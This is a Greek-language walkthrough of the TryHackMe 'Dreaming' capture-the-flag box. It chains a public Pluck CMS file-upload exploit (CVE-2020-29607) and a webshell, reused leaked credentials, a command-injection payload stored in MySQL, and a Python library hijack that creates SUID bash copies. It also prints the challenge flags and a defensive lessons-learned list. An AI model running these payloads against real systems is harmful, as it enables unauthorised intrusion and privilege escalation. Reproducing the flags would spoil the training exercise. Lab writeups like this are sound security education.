# TryHackMe — Dreaming (Writeup)

**Difficulty:** Easy  
**OS:** Linux (Ubuntu 20.04)  
**Tags:** Pluck CMS, CVE-2020-29607, Command Injection, Python Library Hijacking  

---

## Σύνοψη

Το "Dreaming" είναι ένα Linux CTF box στο TryHackMe, βασισμένο στο Sandman universe του Neil Gaiman. Περιλαμβάνει 3 flags (Lucien, Death, Morpheus), κάθε ένα αντιστοιχεί σε lateral movement ή privilege escalation σε διαφορετικό user. Η αλυσίδα επίθεσης:

```
www-data → lucien → death → morpheus
```

---

## 1. Enumeration

### Nmap Scan

```bash
nmap -sC -sV -p- 10.113.139.96
```

**Αποτελέσματα:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.2p1 |
| 80   | HTTP    | Apache 2.4.41 (Ubuntu) |

Η αρχική σελίδα (port 80) είναι η default Apache page ("It works").

### Directory Enumeration

```bash
gobuster dir -u http://10.113.139.96 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

**Αποτελέσματα:**

| Path | Status |
|------|--------|
| /app | 301 (Redirect) |

Μέσα στο `/app/` βρίσκεται ένα directory listing με τον φάκελο `pluck-4.7.13/`.

Πρόκειται για το **Pluck CMS version 4.7.13**.

---

## 2. Initial Access — CVE-2020-29607

### Login στο Pluck CMS

Η login page βρίσκεται στο:

```
http://10.113.139.96/app/pluck-4.7.13/login.php
```

Ζητάει μόνο password (χωρίς username). Δοκιμάζοντας `password` → **επιτυχής login**.

### Searchsploit

```bash
searchsploit pluck 4.7.13
```

```
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated) | php/webapps/49909.py
```

Πρόκειται για το **CVE-2020-29607** — file upload restriction bypass που επιτρέπει ανέβασμα PHP webshell.

### Εκτέλεση Exploit

```bash
searchsploit -m 49909.py
python3 49909.py 10.113.139.96 80 password /app/pluck-4.7.13
```

Το exploit ανεβάζει ένα **p0wny-shell** (web shell) ως `shell.phar`:

```
http://10.113.139.96/app/pluck-4.7.13/files/shell.phar
```

```bash
whoami
# www-data
```

Έχουμε **initial foothold** ως `www-data`.

---

## 3. www-data → Lucien (Credential Discovery)

### Enumeration ως www-data

```bash
ls /home
# death  lucien  morpheus  ubuntu
```

Το flag του lucien (`/home/lucien/lucien_flag.txt`) δεν είναι readable ως www-data.

### Credentials σε Python script

```bash
cat /opt/test.py
```

```python
import requests
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "HeyLucien#@1999!"
...
```

Ο lucien χρησιμοποιεί το password **`HeyLucien#@1999!`** για το Pluck CMS. Δοκιμάζουμε reuse σε SSH:

```bash
ssh lucien@10.113.139.96
# Password: HeyLucien#@1999!
```

### Lucien Flag

```bash
cat ~/lucien_flag.txt
# THM{TH3_L1BR4R14N}
```

---

## 4. Lucien → Death (SQL Injection + Command Injection)

### sudo -l

```bash
sudo -l
```

```
(death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

Ο lucien μπορεί να τρέξει το `getDreams.py` ως **death** χωρίς password.

### Ανάλυση getDreams.py

Το script συνδέεται στη MySQL database `library`, τραβάει data από τον πίνακα `dreams`, και τα περνάει σε subprocess:

```python
command = f"echo {dreamer} + {dream}"
shell = subprocess.check_output(command, text=True, shell=True)
```

Η χρήση `shell=True` με user-controlled input → **command injection vulnerability**.

### MySQL Credentials

Από το `.bash_history` του lucien:

```
mysql -u lucien -plucien42DBPASSWORD
```

MySQL password: **`lucien42DBPASSWORD`**

### Exploitation

```bash
mysql -u lucien -plucien42DBPASSWORD library
```

```sql
USE library;
INSERT INTO dreams (dreamer, dream) VALUES ("hack", "$(cp /bin/bash /tmp/deathbash && chmod u+s /tmp/deathbash)");
exit
```

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
/tmp/deathbash -p
whoami
# death
```

### Death Flag

```bash
cat /home/death/death_flag.txt
# THM{1M_TH3R3_4_TH3M}
```

---

## 5. Death → Morpheus (Python Library Hijacking)

### Enumeration ως death

```bash
sudo -l
# Sorry, user death may not run sudo on ip-10-113-139-96.
```

Δεν υπάρχουν sudo privileges. Ψάχνουμε αλλού.

### Writable Files

```bash
ls -la /usr/lib/python3.8/shutil.py
# -rw-rw-r-- 1 root death 51474 Mar 18 2025 /usr/lib/python3.8/shutil.py
```

Ο **death group** έχει write access στο `shutil.py`!

### restore.py του Morpheus

```bash
cat /home/morpheus/restore.py
```

```python
from shutil import copy2 as backup
src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"
backup(src_file, dst_file)
print("The kingdom backup has been done!")
```

Αυτό κάνει `import shutil` και τρέχει ως **cron job** του morpheus.

### Python Library Hijacking

Προσθέτουμε malicious code στην αρχή του `shutil.py`:

```bash
cp /usr/lib/python3.8/shutil.py /tmp/shutil_backup.py
echo 'import os; os.system("cp /bin/bash /tmp/morphbash && chmod u+s /tmp/morphbash")' > /tmp/payload.py
cat /tmp/payload.py /tmp/shutil_backup.py > /tmp/shutil_new.py
cp /tmp/shutil_new.py /usr/lib/python3.8/shutil.py
```

Μετά από ~1 λεπτό (cron execution):

```bash
ls -la /tmp/morphbash
# -rwsr-xr-x 1 morpheus morpheus 1183448 Jun 26 01:10 /tmp/morphbash

/tmp/morphbash -p
whoami
# morpheus
```

### Morpheus Flag

```bash
cat /home/morpheus/morpheus_flag.txt
```

---

## Attack Chain Summary

```
Nmap + Gobuster
    │
    ▼
Pluck CMS 4.7.13 (weak password: "password")
    │
    ▼
CVE-2020-29607 (File Upload RCE) → webshell ως www-data
    │
    ▼
Credential discovery σε /opt/test.py → SSH ως lucien
    │
    ▼
sudo getDreams.py ως death + SQL command injection → shell ως death
    │
    ▼
Python library hijacking (writable shutil.py + cron) → shell ως morpheus
```

---

## Lessons Learned

- **Credential reuse**: Το password του lucien ήταν hardcoded σε test script, και λειτουργούσε και σε SSH.
- **bash_history**: Ποτέ μην αφήνεις passwords σε command history (π.χ. `mysql -p<password>`).
- **subprocess + shell=True**: Σε Python, ποτέ μην περνάς user input σε subprocess με `shell=True` — χρησιμοποίησε `subprocess.run()` με list arguments.
- **File permissions**: Writable system libraries (shutil.py) σε combination με cron jobs = privilege escalation.
- **Defense in depth**: Κάθε layer (CMS, SSH, MySQL, cron) είχε ξεχωριστή αδυναμία. Αν ένα ήταν patched, η αλυσίδα θα έσπαγε.
